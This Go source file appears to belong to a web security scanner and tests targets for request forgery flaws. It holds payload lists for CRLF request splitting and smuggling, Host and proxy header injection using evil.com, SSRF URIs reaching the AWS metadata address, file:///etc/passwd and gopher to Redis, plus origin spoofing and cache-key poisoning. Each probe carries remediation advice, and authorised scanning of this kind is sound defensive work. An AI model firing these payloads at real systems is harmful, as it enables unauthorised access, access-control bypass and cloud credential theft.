// Package requestforgery provides testing for HTTP Request Forgery vulnerabilities
// beyond standard SSRF, including request splitting, smuggling primitives, and proxy attacks
package requestforgery

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// VulnerabilityType represents request forgery vulnerability types
type VulnerabilityType string

const (
	HTTPRequestSplitting  VulnerabilityType = "http_request_splitting"
	HostHeaderInjection   VulnerabilityType = "host_header_injection"
	AbsoluteURIInjection  VulnerabilityType = "absolute_uri_injection"
	ProxyHeaderInjection  VulnerabilityType = "proxy_header_injection"
	MethodOverride        VulnerabilityType = "method_override"
	URLParameterInjection VulnerabilityType = "url_parameter_injection"
	RefererSpoofing       VulnerabilityType = "referer_spoofing"
	OriginSpoofing        VulnerabilityType = "origin_spoofing"
	CacheKeyInjection     VulnerabilityType = "cache_key_injection"
)

// TestResult represents a request forgery test result
type TestResult struct {
	VulnType    VulnerabilityType `json:"vuln_type"`
	Endpoint    string            `json:"endpoint"`
	Technique   string            `json:"technique"`
	Payload     string            `json:"payload"`
	Vulnerable  bool              `json:"vulnerable"`
	Description string            `json:"description"`
	StatusCode  int               `json:"status_code"`
	Evidence    string            `json:"evidence,omitempty"`
	Severity    string            `json:"severity"`
	Remediation string            `json:"remediation"`
}

// Tester performs request forgery testing
type Tester struct {
	client  *http.Client
	target  string
	timeout time.Duration
}

// NewTester creates a new request forgery tester
func NewTester(target string, timeout time.Duration) *Tester {
	if timeout == 0 {
		timeout = httpclient.TimeoutProbing
	}
	return &Tester{
		client:  httpclient.Default(),
		target:  target,
		timeout: timeout,
	}
}

// RequestSplittingPayloads returns HTTP request splitting payloads
func RequestSplittingPayloads() []struct {
	Payload     string
	Description string
} {
	return []struct {
		Payload     string
		Description string
	}{
		{" HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin", "Basic request splitting"},
		{"\r\nHost: evil.com", "CRLF host injection"},
		{"\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost", "Injected second request"},
		{"%0d%0aHost: evil.com", "URL-encoded CRLF"},
		{"%0d%0a%0d%0aGET /admin", "URL-encoded request injection"},
		{"\\r\\nHost: evil.com", "Escaped CRLF"},
		{"\u000d\u000aHost: evil.com", "Unicode CRLF"},
		{"\r\nX-Injected: true", "Header injection"},
		{"%E5%98%8A%E5%98%8D", "UTF-8 encoded CRLF"},
		{"\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin", "TE smuggle attempt"},
	}
}

// HostHeaderPayloads returns Host header injection payloads
func HostHeaderPayloads() []struct {
	Host        string
	Description string
} {
	return []struct {
		Host        string
		Description string
	}{
		{"evil.com", "External host"},
		{"localhost", "Localhost"},
		{"127.0.0.1", "Loopback IP"},
		{"[::1]", "IPv6 loopback"},
		{"internal.local", "Internal hostname"},
		{"10.0.0.1", "Private IP"},
		{"169.254.169.254", "AWS metadata"},
		{"target.com@evil.com", "At-sign bypass"},
		{"target.com:evil.com", "Colon bypass"},
		{"evil.com%00target.com", "Null byte"},
		{"evil.com#target.com", "Fragment bypass"},
		{"evil.com?.target.com", "Query bypass"},
		{"evil.com/target.com", "Path bypass"},
		{"evil.com\\target.com", "Backslash bypass"},
		{"target.com.evil.com", "Subdomain of evil"},
	}
}

// MethodOverrideHeaders returns HTTP method override headers
func MethodOverrideHeaders() []struct {
	Header string
	Method string
} {
	return []struct {
		Header string
		Method string
	}{
		{"X-HTTP-Method-Override", "DELETE"},
		{"X-HTTP-Method", "PUT"},
		{"X-Method-Override", "PATCH"},
		{"_method", "DELETE"},
		{"X-Original-Method", "DELETE"},
		{"X-Override-Method", "PUT"},
		{"X-HTTP-Method-Override", "TRACE"},
		{"X-HTTP-Method-Override", "CONNECT"},
		{"X-HTTP-Method-Override", "OPTIONS"},
		{"X-HTTP-Method-Override", "HEAD"},
	}
}

// ProxyHeaderPayloads returns proxy-related header payloads
func ProxyHeaderPayloads() []struct {
	Header string
	Value  string
} {
	return []struct {
		Header string
		Value  string
	}{
		{"X-Forwarded-Host", "evil.com"},
		{"X-Forwarded-Server", "evil.com"},
		{"X-Forwarded-Proto", "https"},
		{"X-Original-URL", "/admin"},
		{"X-Rewrite-URL", "/admin/users"},
		{"Proxy-Host", "evil.com"},
		{"Request-URI", "/admin"},
		{"X-Original-Host", "evil.com"},
		{"X-Proxy-URL", "http://evil.com"},
		{"Destination", "http://evil.com"},
		{"True-Client-IP", "127.0.0.1"},
		{"X-Forwarded-For", "127.0.0.1, 192.168.1.1"},
		{"Proxy-Connection", "keep-alive"},
		{"X-Backend-Host", "internal.local"},
	}
}

// AbsoluteURIPayloads returns absolute URI injection payloads
func AbsoluteURIPayloads() []struct {
	URI         string
	Description string
} {
	return []struct {
		URI         string
		Description string
	}{
		{"http://evil.com/", "External absolute URI"},
		{"http://localhost/admin", "Localhost admin"},
		{"http://127.0.0.1/internal", "Loopback internal"},
		{"http://169.254.169.254/latest/meta-data/", "AWS metadata"},
		{"http://[::1]/admin", "IPv6 localhost"},
		{"http://internal.local/api/", "Internal hostname"},
		{"gopher://localhost:6379/_PING", "Gopher protocol"},
		{"file:///etc/passwd", "File protocol"},
		{"dict://localhost:11211/stats", "Dict protocol"},
		{"ftp://internal.local/", "FTP protocol"},
	}
}

// CacheKeyPayloads returns cache key poisoning payloads
func CacheKeyPayloads() []struct {
	Param       string
	Description string
} {
	return []struct {
		Param       string
		Description string
	}{
		{"utm_source=evil", "Unkeyed parameter"},
		{"utm_campaign=test", "Marketing param"},
		{"fbclid=xxx", "Facebook click ID"},
		{"gclid=xxx", "Google click ID"},
		{"_=1234567890", "Cache buster"},
		{"cb=random", "Cache bypass"},
		{"/;evil", "Path parameter"},
		{"#fragment", "Fragment injection"},
		{"//evil.com", "Protocol-relative"},
	}
}

// RefererSpoofingPayloads returns Referer spoofing payloads
func RefererSpoofingPayloads() []string {
	return []string{
		"https://admin.target.com/",
		"https://internal.target.com/",
		"https://localhost/",
		"https://127.0.0.1/",
		"https://target.com/admin/",
		"https://api.target.com/internal/",
		"https://evil.com/",
		"",
	}
}

// OriginSpoofingPayloads returns Origin header spoofing payloads
func OriginSpoofingPayloads() []string {
	return []string{
		"https://evil.com",
		"https://target.com.evil.com",
		"https://eviltarget.com",
		"https://target.com.attacker.com",
		"null",
		"https://localhost",
		"https://127.0.0.1",
		"file://",
	}
}

// TestRequestSplitting tests for HTTP request splitting vulnerabilities
func (t *Tester) TestRequestSplitting(ctx context.Context, param string) ([]TestResult, error) {
	var results []TestResult

	payloads := RequestSplittingPayloads()

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			return results, ctx.Err()
		default:
		}

		// Inject in query parameter
		fullURL := t.target + "?" + param + "=" + url.QueryEscape(p.Payload)

		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
		if err != nil {
			continue
		}

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		body, _ := iohelper.ReadBody(resp.Body, 4096)
		iohelper.DrainAndClose(resp.Body)

		result := TestResult{
			VulnType:   HTTPRequestSplitting,
			Endpoint:   t.target,
			Technique:  p.Description,
			Payload:    p.Payload,
			StatusCode: resp.StatusCode,
			Severity:   "critical",
		}

		// Check for signs of injection
		bodyStr := string(body)
		if strings.Contains(bodyStr, "evil.com") ||
			strings.Contains(bodyStr, "admin") ||
			strings.Contains(bodyStr, "X-Injected") {
			result.Vulnerable = true
			result.Description = fmt.Sprintf("Request splitting via %s", p.Description)
			result.Evidence = truncateBytesSafe(body, 200)
			result.Remediation = "Reject input containing CRLF characters"
		}

		results = append(results, result)
	}

	return results, nil
}

// TestHostHeaderInjection tests for Host header injection
func (t *Tester) TestHostHeaderInjection(ctx context.Context) ([]TestResult, error) {
	var results []TestResult

	payloads := HostHeaderPayloads()

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			return results, ctx.Err()
		default:
		}

		req, err := http.NewRequestWithContext(ctx, "GET", t.target, nil)
		if err != nil {
			continue
		}

		req.Host = p.Host

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		body, _ := iohelper.ReadBody(resp.Body, 4096)
		iohelper.DrainAndClose(resp.Body)

		result := TestResult{
			VulnType:   HostHeaderInjection,
			Endpoint:   t.target,
			Technique:  "Host header manipulation",
			Payload:    p.Host,
			StatusCode: resp.StatusCode,
			Severity:   "high",
		}

		// Check if the injected host is reflected
		bodyStr := string(body)
		if strings.Contains(bodyStr, p.Host) {
			result.Vulnerable = true
			result.Description = fmt.Sprintf("Host header '%s' reflected in response", p.Description)
			result.Evidence = fmt.Sprintf("Injected host '%s' appears in response", p.Host)
			result.Remediation = "Use server's known hostname instead of trusting Host header"
		}

		// Also check for password reset link poisoning potential
		location := resp.Header.Get("Location")
		if strings.Contains(location, p.Host) {
			result.Vulnerable = true
			result.Description = fmt.Sprintf("Host header used in redirect: %s", p.Description)
			result.Evidence = fmt.Sprintf("Redirect contains injected host: %s", location)
		}

		results = append(results, result)
	}

	return results, nil
}

// TestMethodOverride tests for HTTP method override vulnerabilities
func (t *Tester) TestMethodOverride(ctx context.Context, endpoint string) ([]TestResult, error) {
	var results []TestResult

	headers := MethodOverrideHeaders()

	for _, h := range headers {
		req, err := http.NewRequestWithContext(ctx, "POST", t.target+endpoint, nil)
		if err != nil {
			continue
		}

		req.Header.Set(h.Header, h.Method)
		req.Header.Set("Content-Type", defaults.ContentTypeForm)

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}
		iohelper.DrainAndClose(resp.Body)

		result := TestResult{
			VulnType:   MethodOverride,
			Endpoint:   endpoint,
			Technique:  h.Header,
			Payload:    h.Method,
			StatusCode: resp.StatusCode,
			Severity:   "medium",
		}

		// DELETE/PUT returning success on POST could indicate method override works
		if h.Method == "DELETE" && resp.StatusCode == 200 {
			result.Vulnerable = true
			result.Description = fmt.Sprintf("Method override to %s may be accepted via %s", h.Method, h.Header)
			result.Evidence = fmt.Sprintf("POST with %s: %s returned HTTP %d", h.Header, h.Method, resp.StatusCode)
			result.Remediation = "Disable method override headers or restrict to specific routes"
		}

		results = append(results, result)
	}

	return results, nil
}

// TestProxyHeaderInjection tests for proxy header injection
func (t *Tester) TestProxyHeaderInjection(ctx context.Context) ([]TestResult, error) {
	var results []TestResult

	payloads := ProxyHeaderPayloads()

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			return results, ctx.Err()
		default:
		}

		req, err := http.NewRequestWithContext(ctx, "GET", t.target, nil)
		if err != nil {
			continue
		}

		req.Header.Set(p.Header, p.Value)

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		body, _ := iohelper.ReadBody(resp.Body, 4096)
		iohelper.DrainAndClose(resp.Body)

		result := TestResult{
			VulnType:   ProxyHeaderInjection,
			Endpoint:   t.target,
			Technique:  p.Header,
			Payload:    p.Value,
			StatusCode: resp.StatusCode,
			Severity:   "high",
		}

		// Check if header value is reflected or affects behavior
		bodyStr := string(body)
		if strings.Contains(bodyStr, p.Value) {
			result.Vulnerable = true
			result.Description = fmt.Sprintf("%s header value reflected in response", p.Header)
			result.Evidence = fmt.Sprintf("Header value '%s' found in response", p.Value)
			result.Remediation = "Do not trust client-supplied proxy headers for internal routing"
		}

		// Check for admin access via X-Original-URL/X-Rewrite-URL
		if (p.Header == "X-Original-URL" || p.Header == "X-Rewrite-URL") && resp.StatusCode == 200 {
			if strings.Contains(bodyStr, "admin") || strings.Contains(bodyStr, "internal") {
				result.Vulnerable = true
				result.Description = fmt.Sprintf("Access control bypassed via %s", p.Header)
				result.Evidence = truncateBytesSafe(body, 200)
			}
		}

		results = append(results, result)
	}

	return results, nil
}

// TestRefererSpoofing tests for Referer-based access control bypass
func (t *Tester) TestRefererSpoofing(ctx context.Context, protectedPath string) ([]TestResult, error) {
	var results []TestResult

	payloads := RefererSpoofingPayloads()

	for _, referer := range payloads {
		req, err := http.NewRequestWithContext(ctx, "GET", t.target+protectedPath, nil)
		if err != nil {
			continue
		}

		if referer != "" {
			req.Header.Set("Referer", referer)
		}

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		body, _ := iohelper.ReadBody(resp.Body, 4096)
		iohelper.DrainAndClose(resp.Body)

		result := TestResult{
			VulnType:   RefererSpoofing,
			Endpoint:   protectedPath,
			Technique:  "Referer header spoofing",
			Payload:    referer,
			StatusCode: resp.StatusCode,
			Severity:   "medium",
		}

		// Check if spoofed Referer grants access
		if resp.StatusCode == 200 && len(body) > 100 {
			result.Vulnerable = true
			result.Description = fmt.Sprintf("Access granted with Referer: %s", referer)
			result.Evidence = fmt.Sprintf("Got HTTP 200 with spoofed Referer")
			result.Remediation = "Do not rely on Referer header for access control"
		}

		results = append(results, result)
	}

	return results, nil
}

// TestOriginSpoofing tests for Origin-based access control bypass (CORS)
func (t *Tester) TestOriginSpoofing(ctx context.Context) ([]TestResult, error) {
	var results []TestResult

	payloads := OriginSpoofingPayloads()

	for _, origin := range payloads {
		req, err := http.NewRequestWithContext(ctx, "GET", t.target, nil)
		if err != nil {
			continue
		}

		req.Header.Set("Origin", origin)

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}
		iohelper.DrainAndClose(resp.Body)

		result := TestResult{
			VulnType:   OriginSpoofing,
			Endpoint:   t.target,
			Technique:  "Origin header spoofing",
			Payload:    origin,
			StatusCode: resp.StatusCode,
			Severity:   "high",
		}

		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := resp.Header.Get("Access-Control-Allow-Credentials")

		// Check for dangerous CORS configurations
		if acao == origin && origin != "" {
			result.Vulnerable = true
			result.Description = "Origin header is reflected in ACAO"
			result.Evidence = fmt.Sprintf("ACAO: %s reflects Origin: %s", acao, origin)
			if acac == "true" {
				result.Description = "Origin reflected with credentials allowed (Critical)"
				result.Severity = "critical"
			}
			result.Remediation = "Use whitelist for allowed origins, avoid reflecting Origin"
		}

		if acao == "*" {
			result.Vulnerable = true
			result.Description = "Wildcard ACAO allows any origin"
			result.Evidence = "Access-Control-Allow-Origin: *"
			result.Remediation = "Restrict to specific trusted origins"
		}

		if acao == "null" && origin == "null" {
			result.Vulnerable = true
			result.Description = "ACAO accepts null origin (iframe sandbox bypass)"
			result.Evidence = "Access-Control-Allow-Origin: null"
			result.Remediation = "Do not allow null origin"
		}

		results = append(results, result)
	}

	return results, nil
}

// TestCacheKeyInjection tests for cache key injection
func (t *Tester) TestCacheKeyInjection(ctx context.Context) ([]TestResult, error) {
	var results []TestResult

	payloads := CacheKeyPayloads()

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			return results, ctx.Err()
		default:
		}

		fullURL := t.target + "?" + p.Param

		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
		if err != nil {
			continue
		}

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		body, _ := iohelper.ReadBody(resp.Body, 4096)
		iohelper.DrainAndClose(resp.Body)

		result := TestResult{
			VulnType:   CacheKeyInjection,
			Endpoint:   t.target,
			Technique:  p.Description,
			Payload:    p.Param,
			StatusCode: resp.StatusCode,
			Severity:   "medium",
		}

		// Check cache headers
		cacheControl := resp.Header.Get("Cache-Control")
		xCache := resp.Header.Get("X-Cache")
		cfCache := resp.Header.Get("CF-Cache-Status")

		// If cacheable and unkeyed param is reflected
		if !strings.Contains(cacheControl, "no-store") && !strings.Contains(cacheControl, "private") {
			// Safely extract value from param
			paramParts := strings.SplitN(p.Param, "=", 2)
			var checkValue string
			if len(paramParts) > 1 {
				checkValue = paramParts[1]
			} else {
				checkValue = p.Param
			}
			if checkValue != "" && strings.Contains(string(body), checkValue) {
				result.Vulnerable = true
				result.Description = fmt.Sprintf("Unkeyed parameter '%s' is reflected in cached response", p.Description)
				result.Evidence = fmt.Sprintf("Cache headers: %s, X-Cache: %s", cacheControl, xCache)
				if cfCache != "" {
					result.Evidence += fmt.Sprintf(", CF-Cache-Status: %s", cfCache)
				}
				result.Remediation = "Include all varying parameters in cache key or disable caching"
			}
		}

		results = append(results, result)
	}

	return results, nil
}

// RunAllTests runs all request forgery tests
func (t *Tester) RunAllTests(ctx context.Context) ([]TestResult, error) {
	var allResults []TestResult

	// Host header injection
	if results, err := t.TestHostHeaderInjection(ctx); err == nil {
		allResults = append(allResults, results...)
	}

	// Proxy header injection
	if results, err := t.TestProxyHeaderInjection(ctx); err == nil {
		allResults = append(allResults, results...)
	}

	// Origin spoofing (CORS)
	if results, err := t.TestOriginSpoofing(ctx); err == nil {
		allResults = append(allResults, results...)
	}

	// Cache key injection
	if results, err := t.TestCacheKeyInjection(ctx); err == nil {
		allResults = append(allResults, results...)
	}

	return allResults, nil
}

// SummarizeResults summarizes test results
func SummarizeResults(results []TestResult) map[string]int {
	summary := map[string]int{
		"total":      len(results),
		"vulnerable": 0,
		"safe":       0,
		"critical":   0,
		"high":       0,
		"medium":     0,
	}

	for _, r := range results {
		if r.Vulnerable {
			summary["vulnerable"]++
			switch r.Severity {
			case "critical":
				summary["critical"]++
			case "high":
				summary["high"]++
			case "medium":
				summary["medium"]++
			}
		} else {
			summary["safe"]++
		}
	}

	return summary
}

// truncateBytesSafe truncates a byte slice to maxBytes without splitting multi-byte UTF-8 runes.
func truncateBytesSafe(b []byte, maxBytes int) string {
	if len(b) <= maxBytes {
		return string(b)
	}
	for maxBytes > 0 && maxBytes < len(b) && b[maxBytes]>>6 == 0b10 {
		maxBytes--
	}
	return string(b[:maxBytes])
}
